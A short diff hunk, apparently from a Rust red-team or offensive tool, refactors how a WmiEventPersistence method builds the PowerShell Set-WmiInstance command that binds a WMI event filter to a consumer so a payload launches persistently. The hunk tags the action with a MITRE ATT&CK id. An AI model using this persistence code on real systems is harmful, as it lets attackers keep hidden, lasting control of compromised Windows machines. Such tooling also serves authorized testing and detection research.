@@ -381,10 +381,8 @@ impl PersistenceMethod for WmiEventPersistence {
             persistence_name, payload_path
         );
 
-        let binding_cmd = format!(
-            "Set-WmiInstance -Class __FilterToConsumerBinding -Namespace 'root\\subscription' \
-            -Arguments @{{Filter=$filter; Consumer=$consumer}}"
-        );
+        let binding_cmd = "Set-WmiInstance -Class __FilterToConsumerBinding -Namespace 'root\\subscription' \
+            -Arguments @{Filter=$filter; Consumer=$consumer}".to_string();
 
         info!(method = self.name(), mitre = self.mitre_id(), "Installing WMI event persistence");
 
